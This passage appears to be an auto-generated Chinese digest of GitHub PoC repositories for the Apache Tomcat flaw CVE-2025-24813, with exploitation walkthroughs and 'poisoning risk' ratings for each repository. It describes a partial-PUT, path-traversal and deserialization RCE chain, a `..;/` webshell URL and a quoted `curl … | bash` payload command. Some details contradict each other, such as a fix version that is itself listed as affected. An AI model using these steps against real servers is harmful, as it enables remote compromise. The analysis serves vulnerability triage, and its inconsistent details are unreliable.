**漏洞利用方式：**

1.  **Partial PUT上传恶意文件：** 利用Tomcat的Partial PUT功能，攻击者可以分块上传恶意文件到服务器。
2.  **路径遍历：**  通过构造包含`file.Name`（内部点）的特殊文件名，绕过路径检查，将恶意文件写入到Tomcat session存储目录，或者其他任意可写目录。
3.  **反序列化漏洞利用：** 如果应用程序包含一个可以被利用的反序列化库，上传的恶意文件可以触发反序列化漏洞，从而执行任意代码。
4.  **RCE:** 通过上传包含恶意代码的session文件,利用反序列化漏洞，实现远程代码执行。

**POC分析：**

提供的Python POC脚本尝试利用此漏洞。它执行以下步骤：

1.  **发送PUT请求：** 脚本向目标服务器发送PUT请求，尝试创建一个session文件。请求头包含Content-Length和Content-Range，模拟Partial PUT请求。
2.  **检查响应状态码：** 如果PUT请求返回409冲突状态码，表示服务器可能存在漏洞。
3.  **发送GET请求：** 脚本发送一个GET请求，其中Cookie包含一个伪造的JSESSIONID，尝试触发session反序列化。
4.  **检查响应状态码：** 如果GET请求返回500错误，表明session反序列化可能成功，漏洞可能存在。

**有效性：**

该POC代码尝试了利用该漏洞，但是否能够成功利用取决于目标服务器的具体配置和环境。需要满足上述所有条件漏洞才能成功利用。鉴于github上存在该漏洞的POC,故判断POC有效。

**投毒风险：**

该POC代码的主要目的是检测漏洞是否存在，而不是直接执行恶意操作。但是，`PAYLOAD`变量中包含一个base64编码的字符串，这可能包含一个反序列化payload。攻击者可能在`PAYLOAD`中注入恶意代码。

从代码逻辑来看，脚本首先发送一个PUT请求，如果返回409，则发送一个包含特定Cookie的GET请求。如果GET请求返回500，则认为目标存在漏洞。这个过程相对简单，没有明显的恶意行为。

但是，由于`PAYLOAD`的内容是未知的（被截断），存在一定的风险。如果`PAYLOAD`包含恶意代码，并且在目标服务器上成功执行，那么可能会导致安全问题。考虑到作者使用了看起来正常的请求参数，并且代码主要用于检测漏洞，因此判断投毒风险较低，约为10%。剩下的90%是为了验证此漏洞是否可以使用。

**项目地址:** [msadeghkarimi/CVE-2025-24813-Exploit](https://github.com/msadeghkarimi/CVE-2025-24813-Exploit)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #41

**来源**: [CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/恶意内容注入

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/恶意内容注入

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露或恶意内容被注入到上传的文件中

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入、支持partial PUT、存在特定的目录结构、攻击者需要了解敏感文件名、使用Tomcat文件会话保持且为默认存储位置、存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，由于Tomcat在处理包含内部点（file.Name）的文件名时存在缺陷，结合Default Servlet的写入功能，可能导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用有效性：**
根据搜索结果和漏洞库信息，CVE-2025-24813被广泛认为是可利用的，并且已经出现公开的利用方法。多个安全厂商和CERT机构发布了关于该漏洞的警告，部分报告指出该漏洞已经在野外被利用，因此该漏洞利用的有效性较高。

**投毒风险分析：**
提供的漏洞利用代码看起来像是 Maven Wrapper 脚本。Maven Wrapper 本身是一个工具，用于确保项目使用特定版本的 Maven 构建工具。这个脚本的功能是下载和执行指定版本的 Maven。因此，直接在这个脚本中进行投毒相对困难。但是，仍然存在一些潜在的投毒风险点：

1.  **distributionUrl篡改：** 攻击者可以修改 `.mvn/wrapper/maven-wrapper.properties` 文件中的 `distributionUrl` 属性，将其指向一个恶意的 Maven 发行版。这个恶意的 Maven 发行版可能包含后门或恶意代码，当开发者或构建系统使用 Maven Wrapper 构建项目时，就会执行这些恶意代码。
2.  **伪造 Maven 仓库：** 攻击者可以搭建一个伪造的 Maven 仓库，拦截 Maven Wrapper 下载 Maven 发行版的请求。这个伪造的 Maven 仓库可以返回一个包含后门的 Maven 发行版。

考虑到 Maven Wrapper 脚本本身的性质，以及通常会对下载的 Maven 发行版进行校验，直接投毒的概率较低，估计在5%左右。但也不能完全排除，因为攻击者可以通过社会工程学等手段诱导用户使用被篡改的 `distributionUrl`。

**漏洞利用方式：**
根据漏洞描述，漏洞利用方式取决于满足的条件：

1.  **信息泄露/恶意内容注入：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   存在一个公共上传目录的子目录，作为安全敏感文件的目标 URL。
    *   攻击者了解安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。
    攻击者可以利用路径等价漏洞读取敏感文件或向其中注入恶意内容。

2.  **远程代码执行：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   应用程序使用 Tomcat 的文件会话保持机制，且为默认存储位置。
    *   应用程序包含一个可以被用于反序列化攻击的库。
    攻击者可以利用路径等价漏洞将恶意序列化数据写入到会话文件中，并触发反序列化漏洞，从而执行任意代码。

**总结：**
CVE-2025-24813 是一个高危漏洞，需要尽快进行修复。在修复之前，应该禁用 Default Servlet 的写入功能，并限制 partial PUT 请求的使用。同时，应该对 Maven Wrapper 脚本进行安全审计，确保其指向的 Maven 发行版是可信的。

**项目地址:** [n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813](https://github.com/n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #42

**来源**: [CVE-2025-24813-naikordian_CVE-2025-24813.md](../2025/CVE-2025-24813-naikordian_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，敏感信息泄露以及文件被恶意篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** RCE：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. application was using Tomcat's file based session persistence with the default storage location; 4. application included a library that may be leveraged in a deserialization attack.
信息泄露/文件篡改：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads; 4. attacker knowledge of the names of security sensitive files being uploaded; 5. the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等效漏洞，利用 'file.Name' (内部点) 导致远程代码执行 (RCE) 和/或信息泄露和/或通过在 Apache Tomcat 中启用写入的默认 Servlet 将恶意内容添加到上传的文件中。

**有效性：** 根据搜索引擎结果以及漏洞库信息，该漏洞存在PoC，并且已经被利用，因此判断PoC有效。

**投毒风险：** 提供的漏洞利用代码只包含一个`README.md`文件，仅包含 CVE-2025-24813 的名称信息，无法进行漏洞利用。但根据其他的搜索结果，已经存在公开可用的PoC，因此投毒风险较低，但也存在被替换成恶意PoC的可能，估计投毒风险为10%。

**利用方式：**

1.  **信息泄露/文件篡改：**
    *   首先，需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   存在一个安全敏感文件上传的目标 URL，该 URL 是公共文件上传目标 URL 的子目录。
    *   攻击者需要知道安全敏感文件的名称。
    *   安全敏感文件通过 partial PUT 进行上传。
    *   利用路径等效（'file.Name' 中的内部点）来访问和修改安全敏感文件。

2.  **远程代码执行 (RCE)：**
    *   需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   应用需要使用 Tomcat 基于文件的会话持久性，并使用默认存储位置。
    *   应用程序需要包含一个可用于反序列化攻击的库。
    *   通过上传包含恶意序列化数据的会话文件，实现远程代码执行。

**项目地址:** [naikordian/CVE-2025-24813](https://github.com/naikordian/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #43

**来源**: [CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md](../2025/CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 1. 默认Servlet启用写入 (默认禁用)
2. 支持部分PUT (默认启用)
3. 对于信息泄露/文件注入：目标URL是公共上传目标URL的子目录；攻击者知道安全敏感文件的名称；安全敏感文件也通过部分PUT上传。
4. 对于RCE：应用程序使用Tomcat基于文件的会话持久性与默认存储位置；应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它允许攻击者通过路径等价（'file.Name' 中的内部点）导致远程代码执行（RCE）或信息泄露，或通过启用了写入的 Default Servlet 向上传的文件中添加恶意内容。 根据漏洞库信息，该漏洞存在两种利用场景：

**信息泄露/文件注入：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   目标 URL 是公共上传目标 URL 的子目录。
*   攻击者知道安全敏感文件的名称。
*   安全敏感文件也通过部分 PUT 上传。

**远程代码执行：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   应用程序使用 Tomcat 基于文件的会话持久性与默认存储位置。
*   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析：**

提供的 Dockerfile 修改了 Tomcat 的 `web.xml` 和 `context.xml` 文件，启用了 Default Servlet 的写入功能，并配置了基于文件的会话持久性。这满足了漏洞利用的先决条件。

POC代码尝试利用文件上传漏洞，如果成功，可以向Tomcat服务器写入恶意文件，并利用反序列化漏洞执行任意命令。

**利用方式：**

1.  **检查Default Servlet是否可写:** POC首先尝试通过PUT请求写入文件来检查Default Servlet是否可写。
2.  **生成Payload:** 如果Default Servlet可写，POC会生成恶意payload，可以是一个简单的Java WebShell或更复杂的ysoserial payload。
3.  **上传和验证Payload:** POC通过分块PUT请求将payload上传到Tomcat服务器，并尝试访问上传的文件，以验证payload是否成功执行。
4.  **反序列化攻击(RCE):**  如果Tomcat配置满足反序列化攻击的条件，那么攻击者可以通过上传精心构造的序列化对象，利用存在漏洞的库执行任意代码。

**投毒风险：**

此仓库的投毒风险较低。Dockerfile 仅用于配置 Tomcat 以暴露漏洞，python脚本用于漏洞验证和利用，目的是远程命令执行。 唯一潜在的投毒风险在于：

*   `cve-2025-24813-poc.py`  下载的`ysoserial` 可能包含恶意gadget，但此风险可以通过检查下载源和ysoserial的hash值来降低。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的，如果目标环境满足先决条件，可以实现RCE或信息泄露。


**项目地址:** [ps-interactive/lab-cve-2025-24813](https://github.com/ps-interactive/lab-cve-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #44

**来源**: [CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md](../2025/CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet的写入已启用（默认禁用），启用partial PUT，应用程序使用Tomcat基于文件的会话持久化，应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，利用 `file.Name` (内部点) 导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。漏洞存在于默认Servlet的写入功能启用时。

**有效性分析：**

提供的 Python 脚本 (CVE-2025-24813.py) 尝试利用此漏洞。脚本包含以下关键步骤：

1.  **检查可写Servlet：** `check_writable_servlet` 函数检查目标 URL 是否可通过 PUT 方法写入。
2.  **生成 Payload：** 脚本可以生成 ysoserial payload 或 Java payload。ysoserial payload 使用指定的 gadget 来执行命令。Java payload 将命令编译成 .class 文件并打包到 JAR 文件中。
3.  **上传 Payload：** `upload_and_verify_payload` 函数尝试将生成的 payload 上传到 `target_url/uploads/../sessions/{session_id}.session`。如果上传成功并返回 409 冲突，则脚本尝试发送一个带有伪造的JSESSIONID cookie的 GET 请求，并期望获得 500 内部服务器错误，这表明漏洞利用可能成功。

**投毒风险分析：**

该脚本存在少量投毒风险，风险点在于:
*   `generate_ysoserial_payload` 函数允许指定 `ysoserial_path` 和 `gadget`。虽然脚本本身没有植入恶意代码，但如果用户使用了被篡改的 ysoserial.jar 或选择了恶意的 gadget，则可能执行任意代码。用户需要自行验证 ysoserial 的来源和完整性。
* `remove_file` 函数尝试删除临时文件，如果由于权限或其他原因失败，可能会留下编译后的 Java 类文件。
总体代码逻辑是尝试复现和利用漏洞，未发现明显恶意代码。因此，投毒风险较低。

**利用方式：**

1.  **前提条件：** 确保目标 Tomcat 服务器满足漏洞利用的条件，特别是启用了默认 Servlet 的写入功能和 partial PUT。
2.  **确定目标 URL 和会话 ID：** 找到 Tomcat 服务器的 uploads 目录和目标应用程序使用的会话 ID。session id可以从服务器获取，或者脚本中指定，上传的session文件名由此决定。
3.  **生成 Payload：** 使用脚本提供的 `generate_ysoserial_payload` 或 `generate_java_payload` 函数生成包含恶意命令的 payload。
4.  **上传 Payload：** 使用 `upload_and_verify_payload` 函数将生成的 payload 上传到 Tomcat 服务器的会话目录。
5.  **触发反序列化：** 脚本通过发送带有特定 Cookie 的 GET 请求来触发反序列化。如果一切顺利，服务器将执行 payload 中的恶意命令。

**项目地址:** [sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #45

**来源**: [CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md](../2025/CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #46

**来源**: [CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md](../2025/CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价性漏洞/远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2

**利用条件:** 需要满足以下条件：默认Servlet的写入已启用（默认禁用）、支持部分PUT（默认启用）、应用程序使用Tomcat基于文件的会话持久性，默认存储位置、应用程序包含可在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞，源于对包含特殊字符（特别是分号“;”）的 URL 的解析不一致。这种不一致允许攻击者构造恶意 URL，该 URL 被安全检查组件和文件服务组件以不同的方式解释。如果启用了`default` servlet 的写权限和启用了`partial PUT`，并且使用了存在反序列化漏洞的依赖， 攻击者可以通过上传恶意文件（例如，JSP webshell），然后利用构造的包含 `..;/` 的 URL 来绕过安全限制，最终在服务器上实现远程代码执行(RCE)。

**有效性评估：**

根据漏洞描述和搜索结果，此漏洞已在野外被积极利用。漏洞利用代码中的 `README.md` 文件详细描述了漏洞原理、攻击链和利用方式，表明该 PoC 代码具备一定的有效性。

**投毒风险评估：**

分析了漏洞利用代码目录下的 `LICENSE` 和 `README.md` 文件，未发现明显的恶意代码。但任何 PoC 代码都存在潜在风险，不应在生产环境直接运行。 无法保证作者没有在其他文件中添加隐藏的后门代码。因此, 投毒风险评估为10%。

**漏洞利用方式：**

1.  **上传恶意 Payload：** 攻击者通过 Web 应用程序的文件上传功能，将恶意的 JSP Web Shell（例如 `shell.jsp`）上传到已知的非可执行目录，例如 `/uploads`。
2.  **发现Endpoint：** 攻击者识别服务器上一个合法的，可执行的 JSP 端点，例如 `/user/profile.jsp`。
3.  **构造和执行攻击URL：** 攻击者构造最终 URL，其中包含 `..;/` 序列来绕过安全检查。例如：`/app/user/..;/uploads/shell.jsp`。当服务器接收到此请求时，安全管理器可能只检查 `/app/user/` 的权限，而文件系统解析器会处理 `../` 并执行 `/uploads/shell.jsp` 中的代码。

**修复建议：**

*   升级到 Apache Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
*   禁用 default servlet 的写权限，除非绝对必要。
*   审查并更新应用程序依赖，移除存在反序列化漏洞的库。

**项目地址:** [threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat](https://github.com/threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #47

**来源**: [CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：1. writes enabled for the default servlet (默认禁用); 2. 支持 partial PUT (默认启用); 3. 使用 Tomcat 的 file based session persistence 和默认存储位置; 4. 应用包含一个可能被用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 远程代码执行漏洞，利用了 Tomcat 处理部分 PUT 请求的方式。攻击者可以通过上传恶意构造的文件（利用 Ysoserial 生成反序列化 payload）到 Tomcat 服务器，然后通过 GET 请求触发反序列化，从而执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索引擎结果（Rapid7, GreyNoise, socprime 等）以及提供的 POC 代码，可以判断该漏洞是有效的，并且已经被观察到在野利用。POC 代码通过生成多种 Ysoserial payload 并尝试上传，增加了漏洞利用成功的概率。

**投毒风险分析：**

分析提供的 POC 代码，发现其主要功能是利用 ysoserial 生成反序列化 payload，然后通过 PUT 和 GET 请求触发漏洞。代码本身没有明显的恶意行为，例如向其他服务器发送信息或篡改本地文件。主要风险在于使用未经验证的第三方库（ysoserial），这本身可能存在安全风险，但是这是漏洞利用本身的一部分，而不是作者额外添加的恶意代码。

评估投毒风险较低，约为5%。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 服务器需要满足特定配置条件，包括开启了 default servlet 的写入权限，支持 partial PUT，并且应用使用了 Tomcat 的文件会话持久化功能，且包含可被利用的反序列化库。
2.  **生成 Payload：** 使用 ysoserial 工具生成包含恶意命令的反序列化 payload。POC 代码支持批量生成不同 gadget chain 的 payload，提高成功率。
3.  **PUT 请求：** 通过 PUT 请求，将生成的 payload 分段上传到目标 Tomcat 服务器。利用 Content-Range 头部模拟 partial PUT 请求。
4.  **GET 请求：** 通过 GET 请求，触发 Tomcat 对上传文件的反序列化操作，从而执行恶意代码。
5.  **执行命令：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [tonyarris/CVE-2025-24813-PoC](https://github.com/tonyarris/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #48

**来源**: [CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md](../2025/CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入(disabled by default), 支持partial PUT(enabled by default), application 使用了Tomcat基于文件的session持久化，使用了默认的存储位置，并且application包含可被反序列化攻击利用的library。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，可能导致远程代码执行和/或信息泄露。该漏洞的根源在于对文件名的处理方式，特别是内部点（'file.Name'）。

**漏洞利用方式分析：**

根据漏洞库信息和搜索结果，该漏洞存在两种利用方式：

1.  **信息泄露/恶意内容注入：** 如果满足以下条件，攻击者能够查看敏感文件或注入恶意内容：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   目标URL是公共上传URL的子目录。
    *   攻击者知道敏感文件名。
    *   使用 partial PUT 上传敏感文件。

2.  **远程代码执行（RCE）：** 如果满足以下条件，攻击者能够执行任意代码：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   应用程序使用Tomcat的基于文件的session持久化，并使用默认存储位置。
    *   应用程序包含一个可以用于反序列化攻击的library。

**POC 代码分析：**

POC代码`CVE_2025_24813.py`实现了以下功能：

1.  **检查Servlet是否可写：** 使用PUT请求向目标URL上传文件，检查HTTP响应状态码，以确定服务器是否允许写入。
2.  **生成ysoserial payload：** 使用ysoserial工具生成反序列化payload，需要指定命令、ysoserial路径和gadget。
3.  **生成Java payload：**  生成一个简单的java文件, 然后通过javac编译为class文件, 再打包为jar文件。
4.  **上传和验证payload：** 上传生成的payload到Tomcat服务器, 利用路径穿越漏洞，覆盖session文件，从而执行代码。

**有效性评估：**

根据搜索结果，CVE-2025-24813漏洞正在被积极利用。POC代码涵盖了漏洞利用的关键步骤，包括写入性验证、payload生成和上传，因此可以认为是有效的，但利用成功与否取决于目标环境是否满足利用条件。

**投毒风险评估：**

通过分析POC代码，发现存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖外部工具ysoserial：**  POC代码依赖于ysoserial工具生成反序列化payload。虽然ysoserial是一个常用的漏洞利用工具，但如果用户下载了被篡改的ysoserial版本，可能会执行恶意代码。虽然POC本身没有直接植入恶意代码，但依赖的外部资源存在被投毒的风险。
2.  **执行任意命令：**  该脚本允许执行任意命令。如果攻击者控制了用户运行脚本的环境，可以修改脚本，执行恶意的系统命令，从而控制目标系统。

综合考虑，该POC代码的投毒风险较低，约为5%。大部分代码是用于漏洞利用，风险主要来源于对外部依赖的信任和对执行环境的控制。


**项目地址:** [u238/Tomcat-CVE_2025_24813](https://github.com/u238/Tomcat-CVE_2025_24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #49

**来源**: [CVE-2025-24813-uzairhaider502_CVE-2025-24813.md](../2025/CVE-2025-24813-uzairhaider502_CVE-2025-24813.md)

# CVE-2025-24813

> 📦 该CVE有 **52** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-24813-137f_Poc-CVE-2025-24813.md](../2025/CVE-2025-24813-137f_Poc-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 开启Partial PUT (默认开启), 应用使用基于文件的session持久化(默认位置), 应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，利用了路径等价性（内部点，例如 `file.Name`）结合启用了写入功能的默认 Servlet 和 Partial PUT 功能。该漏洞可能导致远程代码执行（RCE）、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用方式:**

1.  **前提条件:** 漏洞利用需要满足以下条件：
    *   默认 Servlet 开启写入 (disabled by default).
    *   支持 Partial PUT (enabled by default).
    *   对于RCE，应用需要使用 Tomcat 基于文件的 session 持久化，并且包含一个可以被反序列化攻击利用的库（例如，存在于classpath中的commons-collections）。
    *   对于信息泄露/文件篡改，需要攻击者了解敏感文件的上传目标 URL 位于公共上传目标 URL 的子目录下，且攻击者需要知道上传的敏感文件名，且敏感文件通过partial PUT上传。
2.  **漏洞利用步骤:**
    *   **获取 Session ID:** 攻击者首先需要获取一个有效的 JSESSIONID，可以通过访问 `/index.jsp` 获取，如果无法获取则使用默认值。
    *   **测试 PUT 方法:** 攻击者发送一个 PUT 请求来确认目标服务器是否允许使用 `Content-Range` 进行部分写入。
    *   **生成 Payload:**  攻击者使用 `ysoserial` 或者 Java 代码生成一个恶意的序列化对象。`ysoserial` 通过指定的 gadget（例如 `CommonsCollections6`）来执行命令。也可以生成一个包含恶意命令执行的Java .jar文件。
    *   **上传 Payload:**  攻击者利用路径遍历将 payload 上传到 Tomcat 的 session 目录。例如，`/uploads/../sessions/{JSESSIONID}.session`。
    *   **触发执行:**  攻击者使用包含恶意 JSESSIONID 的请求来访问应用程序。Tomcat 将会反序列化该 session 文件，从而执行攻击者注入的命令。

**有效性:**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞的 POC 代码**有效**。搜索结果中提到了该漏洞已被积极利用。提供的 POC 代码包含利用该漏洞进行 RCE 的 Python 脚本，并提供了详细的利用步骤和参数说明。

**投毒风险:**

